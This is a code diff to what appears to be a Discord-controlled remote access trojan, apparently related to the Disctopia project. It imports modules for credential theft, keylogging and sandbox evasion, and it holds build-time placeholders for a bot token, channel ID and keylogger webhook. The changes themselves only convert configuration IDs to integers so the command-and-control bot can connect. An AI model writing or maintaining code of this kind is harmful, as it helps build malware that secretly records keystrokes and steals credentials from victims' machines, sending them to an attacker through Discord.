@@ -29,10 +29,10 @@ from libraries import credentials, keylogger, sandboxevasion, disctopia
 # Configuration placeholders - will be replaced by build script
 GUILD_ID = "{GUILD_ID}"
 BOT_TOKEN = "{BOT_TOKEN}"
-CHANNEL_ID = {CHANNEL_ID}
+CHANNEL_ID = "{CHANNEL_ID}"
 KEYLOGGER_WEBHOOK = "{KEYLOGGER_WEBHOOK}"
 
-GUILD = discord.Object(id=GUILD_ID)
+GUILD = discord.Object(id=int(GUILD_ID))
 CURRENT_AGENT = 0
 
 # Global debug mode flag
@@ -154,7 +154,7 @@ class Bot(commands.Bot):
         debug_log(f"Bot connected as {self.user}")
         await self.wait_until_ready()
 
-        self.channel = self.get_channel(CHANNEL_ID)
+        self.channel = self.get_channel(int(CHANNEL_ID))
         debug_log(f"Channel obtained: {self.channel}")
 
         now = datetime.now()
